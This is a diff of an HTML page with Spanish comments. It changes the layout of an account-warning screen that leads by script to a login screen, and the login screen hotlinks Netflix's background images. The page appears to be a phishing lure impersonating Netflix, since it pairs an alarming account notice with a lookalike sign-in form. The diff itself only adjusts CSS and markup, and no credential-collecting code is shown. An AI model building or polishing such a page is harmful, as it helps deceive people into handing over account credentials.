@@ -21,12 +21,11 @@
             background-size: cover;
             color: #e5e5e5;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: block;  /* Aquí cambio para que solo se muestre uno */
         }
 
-        .nl-container {
+        #warning-screen {
+            display: table; /* Mostrar esta pantalla al inicio */
             width: 100%;
             max-width: 600px;
             background-color: rgba(20, 20, 20, 0.85);
@@ -34,6 +33,7 @@
             box-shadow: 0 8px 24px rgba(0,0,0,0.7);
             padding: 40px 30px;
             box-sizing: border-box;
+            margin: 0 auto; /* centrar horizontalmente */
         }
 
         .logo-container {
@@ -100,11 +100,9 @@
             body {
                 padding: 10px;
                 min-height: auto;
-                display: flex;
-                justify-content: center;
-                align-items: center;
+                display: block;
             }
-            .nl-container {
+            #warning-screen {
                 max-width: 360px;
                 max-height: 100vh;
                 padding: 20px 15px;
@@ -319,6 +317,10 @@
         }
         
         @media (max-width: 480px) {
+            html, body {
+                height: 100%;
+                overflow: hidden;
+            }
             #login-screen {
                 background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
                 align-items: flex-start;
@@ -346,7 +348,7 @@
 
 <body>
     <!-- Pantalla 1: aviso cuenta -->
-    <table class="nl-container" width="100%" cellpadding="0" cellspacing="0" role="presentation" id="warning-screen">
+    <table id="warning-screen" cellpadding="0" cellspacing="0" role="presentation">
         <tbody>
             <tr>
                 <td>
@@ -413,7 +415,7 @@
     </div>
 
 <script>
-    // Cuando se haga click en "Iniciar sesión" del primer bloque, ocultar pantalla 1 y mostrar pantalla 2
+    // Al clicar "Iniciar sesión" en pantalla 1, ocultar esa pantalla y mostrar la 2
     document.getElementById('go-login').addEventListener('click', function() {
         document.getElementById('warning-screen').style.display = 'none';
         document.getElementById('login-screen').style.display = 'flex';
